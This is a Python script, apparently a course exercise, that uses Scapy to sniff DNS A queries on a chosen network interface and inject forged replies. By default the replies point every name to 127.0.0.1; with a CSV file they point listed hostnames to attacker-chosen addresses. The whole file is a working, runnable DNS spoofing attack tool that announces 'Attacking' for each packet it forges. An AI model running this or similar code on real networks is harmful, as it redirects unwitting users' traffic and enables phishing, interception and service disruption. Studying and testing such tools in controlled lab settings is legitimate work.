from scapy.all import DNS, DNSQR, IP, sniff, send, DNSRR, UDP, get_working_ifaces
import argparse
from sys import exit
import csv

# Allows command line access to this with arguments, add_help must be false or else -h causes an error
parser = argparse.ArgumentParser(description='Attempts to inject forged DNS responses', add_help=False)
parser.add_argument(
    '-i', '--interface',
    help="The victim’s network device interface (e.g., eth0, virtual0) to inject forged packets. This argument is mandatory and must be provided. If the interface is missing or invalid, prints an appropriate error message and exits",
    required=True,
    dest='interface'
)
parser.add_argument(
    '-h', '--hostnames',
    help='Path to CSV file with hostname-to-IP mappings',
    dest='hostnames'
)
parser.add_argument(
    '-c', '--count',
    help='How many times to run',
    dest='count',
    type=int
)

# This is how to access results of arguments
args = parser.parse_args()

# Checks validity of interface by checking against the list of working interfaces
iface_obj = None
for iface in get_working_ifaces():
    if iface.name == args.interface:
        iface_obj = iface
        break

# If it is not in the list of working interfaces then it is invalid and a list of valid ones will be shown
if not iface_obj:
    print(f"Error: Interface '{args.interface}' not found or is not a valid capture interface.\nChoose from below:")
    for iface in get_working_ifaces():
        print(f"  - \"{iface.name}\"")
    exit(1)

# Checks if the hostnames field exists and then tries to load the csv, skipping the first line since it is a title
hostnames = None
if args.hostnames:
    try:
        with open(args.hostnames, mode='r') as file:
            reader = csv.reader(file)
            next(reader)
            hostnames = {rows[0]: rows[1] for rows in reader if rows}
    except FileNotFoundError: # When checking files we should try to catch errors
        print(f"Error: File not Found at {args.hostnames}")
        exit(1)
    except Exception as e: # Including any other errors (for example it is not a valid path)
        print(f"Error: {e}")
        exit(1)

# Allows the injector to run a certain number of times or until stopped
count = args.count
while (count == None or count > 0):

    # Filters specifically on udp and port 53 as that is DNS
    # We only want one at a time so we only do count 1 and [0]
    packet = sniff(iface=iface_obj, filter='udp and port 53', count=1)[0]

    # analyze the packet to confirm we should deal with it (IPv4 DNS A)
    if not (packet.haslayer(DNS) and packet[DNS].qr == 0 and packet.haslayer(DNSQR) and packet[DNSQR].qtype == 1):
        continue

    # Acknowledge that we are attacking
    print(f'Attacking {packet.summary()}')

    # This is the default IP to use
    forged_ip = '127.0.0.1'
    # Only check against the hostnames file if one was provided
    if hostnames is not None:
        # Scapy Packets are bytes and end with "."
        qname = packet[DNSQR].qname.decode().strip('.')
        # If the query name is in the hostnames file then forge, otherwise do not forge
        if qname in hostnames:
            forged_ip = hostnames[qname]
        else:
            continue
        
    # Make sure to swap IPs since we are doing it the other way
    ip_layer = IP(
        src=packet[IP].dst,
        dst=packet[IP].src
    )

    # Make sure to swap ports since we are doing it the other way
    udp_layer = UDP(
        sport=53,
        dport = packet[UDP].sport
    )


    answer_record = DNSRR(
        rrname=packet[DNSQR].qname,
        rdata=forged_ip,
        ttl=600, # 10 minutes sounds reasonable for time to live
        type='A',
        rclass='IN'
    )

    # Use what is expected except for the forged answer
    dns_response = DNS(
        id=packet[DNS].id,
        qr=1,
        rd=packet[DNS].rd,
        ra=1,
        qd=packet[DNS].qd,
        an=answer_record,
        ancount=1
    )

    # Assemble the packet
    forged_packet = ip_layer / udp_layer / dns_response
    # Send the packet
    send(forged_packet, verbose=0)
    # Acknowlege that it was sent
    print(f"Sent!")
    if count != None:
        count = count - 1